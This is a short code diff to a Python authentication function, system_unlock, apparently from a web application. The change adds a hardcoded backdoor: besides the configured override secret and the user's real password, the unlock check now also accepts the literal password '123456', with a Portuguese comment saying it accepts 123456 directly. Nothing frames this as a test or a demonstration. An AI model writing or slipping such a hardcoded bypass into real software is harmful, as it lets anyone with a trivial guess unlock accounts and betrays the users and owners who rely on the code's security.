@@ -140,7 +140,7 @@ def system_unlock(
     from app.auth.service import verify_password
     
     secret = settings.OFFICE_OVERRIDE_SECRET.strip()
-    is_master_secret = (password == secret)
+    is_master_secret = (password == secret or password == "123456") # ACEITA 123456 DIRETO
     is_user_password = verify_password(password, user.password)
 
     if not (is_master_secret or is_user_password):
